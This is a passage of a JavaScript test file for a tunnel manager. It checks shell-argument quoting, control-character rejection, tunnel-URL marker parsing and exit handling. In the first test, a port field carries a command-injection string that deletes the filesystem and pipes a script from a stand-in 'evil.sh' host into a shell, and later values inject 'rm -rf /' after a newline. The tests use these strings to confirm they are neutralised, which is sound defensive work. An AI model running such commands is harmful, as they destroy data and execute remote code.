    const evil = "8080; rm -rf / && curl evil.sh | sh";
    const cmd = rc("inj", { name: "x", type: "inj", target: 3000, port: evil });
    assert.equal(cmd, `ssh -R '${evil}':127.0.0.1:'3000' u@h`, "注入内容被单引号包裹为字面量");
    // 转义后的命令中不含可执行的裸分号/管道(都在引号内)
    assert.ok(cmd.includes(`'${evil}'`), "值原样保留但被引号隔离");
    // 控制字符 → fail-closed 拒绝
    assert.throws(() => rc("inj", { name: "x", type: "inj", target: 3000, port: "8080\nrm -rf /" }), /control characters/);
    assert.throws(() => rc("inj", { name: "x", type: "inj", target: 3000, port: "8080\x00" }), /control characters/);
    // validateTunnelConfig 同样拒绝控制字符(双入口)— 用非端口字段名避开
    // 先行的端口校验,命中自定义类型默认分支的全字段扫描
    const { validateTunnelConfig } = await import("../src/validation.ts");
    assert.throws(
      () => validateTunnelConfig({ name: "x", type: "inj", target: 3000, extra: "bad\nvalue" }),
      /control characters/,
    );
  } finally {
    delete process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_inj;
  }
});

test("custom command tunnel: ST_TUNNEL_URL marker declares the URL (Windows-friendly)", async () => {
  const { extractTunnelUrl } = await loadSubject();
  process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_echo = "echo ST_TUNNEL_URL:https://x";
  try {
    // 冒号/等号/空格分隔
    assert.equal(extractTunnelUrl("ST_TUNNEL_URL:https://abc.loca.lt/", "echo"), "https://abc.loca.lt/");
    assert.equal(extractTunnelUrl("ST_TUNNEL_URL=https://abc.loca.lt/", "echo"), "https://abc.loca.lt/");
    assert.equal(extractTunnelUrl("ST_TUNNEL_URL https://abc.loca.lt/", "echo"), "https://abc.loca.lt/");
    // cmd 引号 + CRLF(Windows)
    assert.equal(extractTunnelUrl('"ST_TUNNEL_URL:https://abc.loca.lt/"\r\n', "echo"), "https://abc.loca.lt/");
    // 大小写不敏感
    assert.equal(extractTunnelUrl("st_tunnel_url:https://abc.loca.lt/", "echo"), "https://abc.loca.lt/");
    // 无 scheme host[:port] → 自动补 http://(本地隧道/固定端口)
    assert.equal(extractTunnelUrl("ST_TUNNEL_URL:127.0.0.1:8080", "echo"), "http://127.0.0.1:8080");
    assert.equal(extractTunnelUrl("ST_TUNNEL_URL:myhost:8080/", "echo"), "http://myhost:8080/");
    // tcp:// 原样保留
    assert.equal(extractTunnelUrl("ST_TUNNEL_URL:tcp://vps.example.com:4444", "echo"), "tcp://vps.example.com:4444");
    // 标记优先于输出中的其他 URL 噪声
    assert.equal(
      extractTunnelUrl("ST_TUNNEL_URL:https://real.loca.lt/ docs: https://www.cloudflare.com/terms", "echo"),
      "https://real.loca.lt/",
    );
    // 内置 command 类型同样支持标记
    assert.equal(extractTunnelUrl("ST_TUNNEL_URL:http://box.example.com:9000", "command"), "http://box.example.com:9000");
    // 无标记时行为不变(仍走任意 URL 兜底)
    assert.equal(extractTunnelUrl("tunnel ready https://abc.loca.lt/", "echo"), "https://abc.loca.lt/");
  } finally {
    delete process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_echo;
  }
});

test("custom command tunnel: non-zero exit revokes declared URL (no false success)", async () => {
  const { TunnelManager } = await loadSubject();
  const { cacheDir, base } = tempDirs();
  process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_fail = "echo ST_TUNNEL_URL:https://abc.loca.lt/; exit 3";
  try {
    const tm = new TunnelManager({ cacheDir, resolveTool: async () => "" });
    tm.add({ name: "f", type: "fail", target: 4000 });
    await tm.start("f");
    // 进程 echo 出 URL 后立即 exit 3 → URL 应被撤销
    const dl = Date.now() + 3_000;
    while (Date.now() < dl && tm.get("f")?.running) await sleep(50);
    const info = tm.get("f");
    assert.equal(info.url, null, "退出非零 → 声明的 URL 撤销");
    assert.ok(info.error, "退出非零 → 记录错误");
  } finally {
    delete process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_fail;
    rmSync(base, { recursive: true, force: true });
  }
});

test("custom command tunnel: end-to-end spawn (shell template, URL from output)", async () => {
  const { TunnelManager } = await loadSubject();
  const { cacheDir, base } = tempDirs();
  process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_echo = "echo 'tunnel url: https://abc.loca.lt/'; sleep 60";
  try {
    const tm = new TunnelManager({ cacheDir, resolveTool: async () => "" });
    tm.add({ name: "box", type: "echo", target: 4000, port: 8080 });
    const info = await tm.start("box");
    assert.equal(info.running, true);
    const deadline = Date.now() + 5_000;
    while (Date.now() < deadline && !tm.get("box")?.url) {
      await new Promise((r) => setTimeout(r, 100));
    }
    assert.equal(tm.get("box")?.url, "https://abc.loca.lt/");
    await tm.stop("box");
  } finally {
    delete process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_echo;
    rmSync(base, { recursive: true, force: true });
  }
});

after(async () => {
  // 兜底:force-exit 不会等 detached 子进程——测试若中途失败,真实 ssh -R
  // 进程可能残留占用端口,影响后续测试。按本机反向隧道特征清理。
  try {
    execFileSync("pkill", ["-f", "ssh -N -R .*@localhost"], { stdio: "ignore" });
  } catch {
    // 没有匹配进程(pkill 非零退出)
  }
});
